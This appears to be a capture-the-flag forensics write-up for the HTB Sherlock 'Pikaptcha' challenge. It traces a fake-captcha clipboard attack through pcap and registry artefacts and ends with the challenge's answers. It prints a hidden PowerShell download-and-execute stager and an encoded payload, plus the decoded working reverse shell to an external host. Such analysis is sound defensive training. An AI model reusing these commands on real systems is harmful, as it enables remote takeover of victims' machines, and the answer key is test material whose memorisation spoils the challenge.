@@ -1,0 +1,144 @@
+HTB Sherlock - Pikaptcha
+
+Scenario: Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing attacks last year and was now aware of attacker tactics, immediately notified the security team to isolate the machine as he suspected an attack. You are provided with network traffic and endpoint artifacts to answer questions about what happened.
+
+Tasks:
+1. It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.
+2. At what time in UTC did the malicious payload execute?
+3. The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script?
+4. To which port did the reverse shell connect?
+5. For how many seconds was the reverse shell connection established between C2 and the victim's workstation?
+6. Attacker hosted a malicious Captcha to lure in users. What is the name of the function which contains the malicious payload to be pasted in victim's clipboard?
+
+
+Initial point:
+We are given a zip file that has the entire C directory of the computer and a pcap file that has the network traffic to the users device.
+
+Data given:
+The Download have two files in it:
+unzipping the download file gives:
+	command: unzip Pikaptcha.zip
+	result:
+		Pikaptcha/
+		Pikaptcha/pikaptcha.pcapng
+		Pikaptcha/2024-09-23T052209_alert_mssp_action.zip
+
+unzipping the second zip file gives us:
+	command: unzip Pikaptcha/2024-09-23T052209_alert_mssp_action.zip
+	result:
+		2024-09-23T05_22_09_5720380_CopyLog.csv
+		2024-09-23T05_22_09_5720380_SkipLog.csv.csv
+		C/
+	the C/ directory contains the users home directory, system32 etc...
+
+
+PCAP Analysis
+
+I will use wireshark to look at the pcap file.
+[Screenshot - mostly http and tcp traffic ]
+After looking at the traffic I can confirm that the most of the traffic is just HTTP / TCP.
+
+The Main IP's to stand out where
+	58.65.192.225
+	172.17.79.129/24 (Local IP)
+
+The scenario said something about downloading microsoft office. Since this is a http traffic we can look at the files in this traffic by going to file>Exprt Objects>HTTP
+After searching for a while I found that searching for 'install' shows a powershell script called 'office2024install.ps1' . Save that file.
+Also we will search for traffic from that IP address from where the download file originated: 43.205.115.44
+
+search string: ip.addr == 43.205.115.44
+[Screenshot - search for ip]
+
+looking at the traffic we can see the user requesting to download the file 'office2024install.ps1'.
+we need to find the time when this file was executed.
+
+
+The captcha attack:
+
+lets, look at other requests, the user said he solved a captcha, there should be something related to it here.
+[screenshot - HtmlFileInWireshark]
+lets save it and view it in the browser
+[screenshot - captcha verifcation browser]
+there is the captcha verification which made the user copy a command and run it in the WIN+R window.
+This page will automatically copy a payload to our clipboard and then we are instructed to click win+R which opens up this:
+[Screenshot - win+R]
+then the page says to press ctr+v to paste the payload and press enter which will run it, it downloads the office2024install.ps1 file
+[Task 1 Answer]
+payload:
+	powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"
+
+
+The reverse shell
+
+command: cat office2024install.ps1 
+result:
+	powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANAAzAC4AMgAwADUALgAxADEANQAuADQANAAiACwANgA5ADYAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
+
+
+[Task 3 Answer] Our 3rd task was to find the sha256 checksum of the powershell script.
+
+command: sha256sum office2024install.ps1
+result: 579284442094e1a44bea9cfb7d8d794c8977714f827c97bcb2822a97742914de	office2024install.ps1
+
+Now we can need to decode the payload. This looks like a base64 string.
+command: cat office2024install.ps1 | cut -d' ' -f3 | base64 -d | tr ';' '\n'
+result:
+	$client = New-Object System.Net.Sockets.TCPClient("43.205.115.44",6969)
+	$stream = $client.GetStream()
+	[byte[]]$bytes = 0..65535|%{0}
+	while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+	$sendback = (iex $data 2>&1 | Out-String )
+	$sendback2 = $sendback + "PS " + (pwd).Path + "> "
+	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+	$stream.Write($sendbyte,0,$sendbyte.Length)
+	$stream.Flush()}
+	$client.Close()
+
+looks like this is a reverse shell connecting to 43.205.115.44 on port 6969
+[Task 4 Answer] The reverse shell connected to port 6969
+Now we can look at the traffic from that ip and port
+	ip.addr == 43.205.115.44 && tcp.port == 6969
+
+[Task 5 Answer]
+by looking at the timestamps we can see that the first SYN Packet came in at 10:37:48 and finished with a FIN packet at 10:44:31
+So the entire time duration of the Reverse shell is 403.410961 ~ 403 seconds.
+
+
+[Task 2 Answer]
+Now we need to find the time of execution of the actual payload. Since the payload was executed in a Run Dialog box or the Run command windows. Windows doesn't log the powershell or cmd commands directly but in the case of commands run in the run command dialog box it will be stored in the RunMRU registry key log.
+So to view the contents of the user Happy Grunwald we need the .DAT file C:\Users\happy.grunwald\NTUSER.DAT . 
+In registry explorer we need to select the NTUSER.DAT file and two Log files in the same directory when asked.
+And then in the search bar search for 'runmru' this will show a registry key, click on it.
+Now you can see the two values that is useful to us: 'Executable' with the command and 'Opened On' with date and time of execution.
+from there we can get the answer to the second task which is it fidn the date and time of the execution: 2024-09-23 05:07:45
+
+Answers
+
+1. It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.
+[Answer]: powershell -NOP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"
+
+
+2. At what time in UTC did the malicious payload execute?
+
+[Answer]: 2024-09-23 05:07:45
+
+
+3. The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script?
+
+[Answer]: 579284442094E1A44BEA9CFB7D8D794C8977714F827C97BCB2822A97742914DE
+
+
+4. To which port did the reverse shell connect?
+
+[Answer]: 6969
+
+
+5. For how many seconds was the reverse shell connection established between C2 and the victim's workstation?
+
+[Answer]: 403
+
+
+6. Attacker hosted a malicious Captcha to lure in users. What is the name of the function which contains the malicious payload to be pasted in victim's clipboard?
+
+[Answer]: stageClipboard
